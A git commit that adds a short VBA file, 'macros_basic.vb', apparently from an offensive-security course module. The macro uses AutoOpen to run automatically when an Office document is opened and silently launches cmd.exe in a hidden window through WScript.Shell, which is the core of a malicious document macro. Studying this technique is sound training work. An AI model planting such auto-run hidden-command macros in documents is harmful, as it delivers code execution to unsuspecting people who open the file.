e648ad433b75418cb9754337f3ccf8b1b47a9d5f
Emmanouil Perselis <okmanolos1@hotmail.com>
2020-12-06 13:15:18 +0100

    Create macros_basic.vb

---
+++ module_3/macros_basic.vb
@@ -0,0 +1,14 @@
+'Sub Document_Open()
+'    MyMacro
+'End Sub
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "cmd.exe"
+    ' Shell str, vbHide
+    ' or
+    CreateObject("Wscript.Shell").Run str, 0
+End Sub
